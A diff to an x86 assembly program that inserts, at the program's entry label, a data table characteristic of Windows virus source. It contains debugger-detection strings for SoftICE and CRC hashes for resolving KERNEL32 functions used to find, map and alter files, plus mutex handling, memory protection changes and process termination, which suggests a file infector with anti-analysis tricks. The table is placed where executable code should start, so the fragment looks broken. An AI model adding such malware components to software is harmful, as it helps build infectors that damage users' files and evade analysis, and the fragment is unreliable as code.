@@ -50,6 +50,32 @@ global _start
 
 _start:
 ; begin main 
+szK32  db	'KERNEL32.dll',0	;name of DLL
+sice95 db	'\\.\SICE',0		;SoftICE/95/98
+siceNT db	'\\.\NTICE',0		;SoftICE/NT
+crcAPI dd	0AE17EBEFh		;FindFirstFileA
+       dd	0AA700106h		;FindNextFileA
+       dd	0C200BE21h		;FindClose
+       dd	03C19E536h		;SetFileAttributesA
+       dd	04B2A3E7Dh		;SetFileTime
+       dd	08C892DDFh		;CreateFileA
+       dd	096B2D96Ch		;CreateFileMappingA
+       dd	0797B49ECh		;MapViewOfFile
+       dd	094524B42h		;UnmapViewOfFile
+       dd	019F33607h		;CreateThread
+       dd	0D4540229h		;WaitForSingleObject
+       dd	068624A9Dh		;CloseHandle
+       dd	020B943E7h		;CreateMutexA
+       dd	0C449CF4Eh		;ReleaseMutex
+       dd	0C6F22166h		;OpenMutexA
+       dd	00AC136BAh		;Sleep
+       dd	079C3D4BBh		;VirtualProtect
+       dd	0EB1CE85Ch		;GetCurrentProcessId
+       dd	033D350C4h		;OpenProcess
+       dd	041A050AFh		;TerminateProcess
+       dd	04134D1ADh		;LoadLibraryA
+       dd	0FFC97C1Fh		;GetProcAddress
+       dd	0AFDF191Fh		;FreeLibrary
 
 section .data
 point db ".",0
